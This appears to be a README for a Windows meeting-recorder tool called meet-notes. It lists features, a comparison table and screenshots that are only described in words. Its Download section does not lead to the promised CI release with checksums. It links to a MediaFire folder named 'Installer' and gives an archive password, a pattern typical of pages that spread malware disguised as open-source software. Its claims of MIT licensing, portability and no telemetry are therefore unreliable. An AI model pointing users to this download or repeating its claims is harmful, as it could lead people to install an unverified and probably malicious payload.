# meet-notes

🗒️ Free, open-source meeting recorder and note taker for Windows — local transcription plus LLM summaries. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click recording** — captures microphone and system audio together so remote calls are fully captured
- ✅ **Local transcription** — Whisper models turn the recording into timestamped text without a cloud account
- ✅ **LLM summaries** — decisions, topics and open questions extracted by a local model you point it at
- ✅ **Action item list** — who agreed to do what, pulled out as a checklist with timestamps back to the audio
- ✅ **Markdown export** — notes in a format that drops straight into Obsidian or a repo
- ✅ **Live level guard** — warns when mic and system audio are unbalanced before the meeting is ruined
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why meet-notes

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **meet-notes** | Otter | Teams built-in | Whisper scripts |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid tiers | Bundled with plan | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Audio stays local | **Yes** | Upload | Cloud | Yes
| Local LLM summary | **Yes** | No | Cloud | Scripted
| Works for any app's call | **Yes** | Partial | Teams only | Manual routing
| Portable, no install | **Yes, 100 MB** | App or web | Installer | Python env

## FAQ

**how to transcribe and summarize meetings locally without uploading audio?**

Meeting assistants all want the call uploaded to their servers, which many workplaces forbid. meet-notes records both audio streams on the machine, transcribes with local Whisper and summarizes with your own local LLM. It is a 100 MB portable exe, MIT, offline, and works with any meeting app.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark meeting view (#121417, amber #FBBF24): recording indicator with dual level meters, live transcript scrolling with speaker labels, elapsed chip reading 43 minutes.
2. Summary card at session end: three decisions listed, open questions section, action item checklist with five rows and timestamp links.
3. Export dialog: markdown template picker, split by topic toggle, attachments folder set, toast reading notes saved with 38 transcript anchors.

## Download

| Source | Link |
|---|---|
| 💾 **Installer meet-notes** | [Installer meet-notes](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).